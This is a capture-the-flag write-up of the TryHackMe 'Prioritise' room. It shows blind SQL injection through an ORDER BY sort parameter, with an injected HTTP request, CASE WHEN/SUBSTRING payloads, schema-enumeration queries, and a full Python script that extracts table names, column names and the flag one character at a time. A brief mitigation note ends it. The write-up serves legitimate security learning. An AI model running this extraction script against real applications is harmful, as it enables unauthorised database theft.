---
title: TryHackMe - Prioritise
author: 0
date: 2023-05-31 16:00:00 +0800
categories: [thm, machine]
tags: [sql-injection, order-by]
render_with_liquid: false
---

>In this challenge you will explore some less common SQL Injection techniques.

>We have this new to-do list application, where we order our tasking based on priority! Is it really all that secure, though...?

The application starts off with a homepage that includes a simple to do list application.

![Homepage](/assets/img/thm-prioritise-homepage.png)

## Enumeration

We see there are different fields, by exploring different injections, we find the sort-by field is vulnerable to sql injection.

The default sorting on title is in ascending order (ASC)

![Homepage](/assets/img/thm-prioritise-default-sort-asc.png)

If we capture the request and modify the `order` parameter and inject ` DESC--` to change the ordering to descending order and comment out the rest of the query.

```
GET /?order=title%20DESC%20-- HTTP/1.1
Host: 10.10.63.92
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.63.92/?success=Added%20new%20item
Upgrade-Insecure-Requests: 1
```

We get our todo list in descending order, confirming this application is vulnerable to an [order by sql injection](https://portswigger.net/support/sql-injection-in-the-query-structure).

![Homepage](/assets/img/thm-prioritise-injection-sort-desc.png)

## Exploit
>In an SQL Injection attack targeting the `ORDER BY` clause, an attacker can manipulate the query to control the sorting order of the result set. By supplying a specially crafted input, the attacker can inject malicious code that alters the query's behavior and potentially exposes sensitive data.

>Exploiting SQL injection in the `ORDER BY` clause requires a different approach compared to other injection cases. Typical SQL keywords like `UNION`, `WHERE`, `OR`, and `AND` cannot be used. Instead, the attacker needs to specify a nested query in place of the `ORDER BY` parameter.

Because we can only control the ordering of the result, we will need to use this to loop over a set of characters and to build up the data we need by verifying if the result has been ordered in a specific way.

We can use a `CASE WHEN` together with `SUBSTRING` to achieve this.

```sql
(CASE WHEN (SELECT (SUBSTRING(column,start_pos,end_pos)) from table = char_to_match then order_value_1 else order_value_2 end) ASC
```

If the `SUBSTRING` matches the `char_to_match` then the result will be ordered by `order_value_1` otherwise by `order_value_2`

### Getting the table value
As we don't know what tables are used in this application, we start by dumping the table data. By trial and error, we found it this application uses `sqlite`, there are a few queries to try to find this data.

#### SQLite
```sql
SELECT tbl_name FROM sqlite_master WHERE type='table' and
tbl_name NOT like 'sqlite_%'
```

#### MySQL, SQL Server
```sql
SELECT table_schema, table_name, 1 FROM information_schema.tables
```

####  Oracle
```sql
SELECT table_name, 1 FROM all_tables
```

### Getting the column names
Once we get the tables, we can iterate over the column names for each table. In SQLite, we can use `pragma_table_info`.
```sql
SELECT name FROM pragma_table_info('table_value')
```

### Exfiltrating the data
We can now build our payload with the data we gathered. In the script added below, we:
1. We first create test data that has a different ordering based on title and date. 
2. We then gather the table and column values.
3. will loop over all tables and associated columns.
4. We will inject the payload `payload = f'(CASE WHEN (SELECT (SUBSTRING({column[0]},1,{len(flag)+1})) from {table}) = \"{flag + char}\" then title else date end) ASC'`.
    >This payload uses the SUBSTRING() function to extract a portion of a column's value from the specified table. The extracted portion is then compared to the concatenation of the `flag` variable and the current `char` character. If the comparison is true, the result will be ordered based on the `title` column; otherwise, on the `date` column. The result set is ordered in ascending order.
5. We compare the result with the a stored "right" response being the sort based on the `title` column. If they match we know that character is part of the flag.

### Script
While this script could be improved to avoid duplicate code. I left it as is, to show the different steps more clearly. I could hardcode the table we needed but I prefer to write scripts that solve the challenge standalone.

```python
import requests
import sys
import string

url = sys.argv[1]
dictionary = string.printable

# add test data
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0', 'Content-Type': 'application/x-www-form-urlencoded'}
data = ['a', 'b', 'c']
# making sure there is a different order for order by data
day = 4
print('### ADDING TEST DATA ###')
for d in data:
    response = requests.post(url + '/new', headers=headers, data=f'title={d}&date=0{day}%2F01%2F2023')
    day = day - 1
    print(f'title: {d} - date: 0{day}/01/2023')

response = requests.get(url + '/?order=title')
correct = response.text

# find the table and column names
print('')
print('### DUMPING TABLES ###')
found_tables = ''
count = 0
while count < len(dictionary):
    for char in dictionary:
        count = count + 1
        payload = f'(CASE WHEN (SELECT (SUBSTRING(GROUP_CONCAT(tbl_name),1,{len(found_tables)+1})) from sqlite_master WHERE type=\"table\" and tbl_name NOT like \"sqlite_%\") = \"{found_tables + char}\" then title else date end) ASC'
        response = requests.get(url + f'/?order={payload}')
        if response.text == correct:
            found_tables += char
            count = 0
tables = found_tables.split(',')
print(tables)

# find columns of tables
print('')
print('### DUMPING COLUMNS ###')
table_columns = {}
for table in tables:
    count = 0
    found_columns = ''
    table_columns[table] = []
    while count < len(dictionary):
        for char in dictionary:
            count = count + 1
            payload = f'(CASE WHEN (SELECT (SUBSTRING(GROUP_CONCAT(name),1,{len(found_columns)+1})) from pragma_table_info(\"{table}\")) = \"{found_columns + char}\" then title else date end) ASC'
            response = requests.get(url + f'/?order={payload}')
            if response.text == correct:
                found_columns += char
                count = 0
    table_columns[table].append(found_columns)
    print(f'{table} - {found_columns}')

# find the flag
print('')
print('### FINDING FLAG ###')
for table, column in table_columns.items():
    count = 0
    flag = ''
    #loop over all available tables
    while count < len(dictionary):
        for char in dictionary:
            count = count + 1
            payload = f'(CASE WHEN (SELECT (SUBSTRING({column[0]},1,{len(flag)+1})) from {table}) = \"{flag + char}\" then title else date end) ASC'
            print(payload)
            response = requests.get(url + f'/?order={payload}')
            if response.text == correct:
                flag += char
                count = 0
    print(f'{table} - {column[0]} - {flag}')
```

#### Output
```sql
$ python3 exploit.py http://10.10.63.92
### ADDING TEST DATA ###
title: a - date: 03/01/2023
title: b - date: 02/01/2023
title: c - date: 01/01/2023

### DUMPING TABLES ###
['todos', 'flag']

### DUMPING COLUMNS ###
todos - i
flag - flag

### FINDING FLAG ###
(CASE WHEN (SELECT (SUBSTRING(i,1,1)) from todos) = "0" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(i,1,1)) from todos) = "1" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(i,1,1)) from todos) = "2" then title else date end) ASC
...
(CASE WHEN (SELECT (SUBSTRING(i,1,1)) from todos) = "}" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(i,1,1)) from todos) = "~" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(i,1,1)) from todos) = " " then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = "0" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = "1" then title else date end) ASC
...
(CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = "9" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = "a" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = "b" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = "c" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = "d" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = "e" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = "f" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,2)) from flag) = "fg" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,2)) from flag) = "fh" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,2)) from flag) = "fi" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,2)) from flag) = "fj" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,2)) from flag) = "fk" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,2)) from flag) = "fl" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,3)) from flag) = "flm" then title else date end) ASC
...
(CASE WHEN (SELECT (SUBSTRING(flag,1,11)) from flag) = "flag{65f2f'" then title else date end) ASC
(CASE WHEN (SELECT (SUBSTRING(flag,1,11)) from flag) = "flag{65f2f(" then title else date end) ASC
...
(CASE WHEN (SELECT (SUBSTRING(flag,1,39)) from flag) = "flag{65f**REDACTED**dcd}" then title else date end) ASC
flag - ['flag'] - flag{65f**REDACTED**dcd}
```

## Mitigation
 Sanitizing and validating user input, using prepared statements or parameterized queries, and implementing proper input/output encoding are some of the best practices to mitigate the risk of all SQL injection attacks.
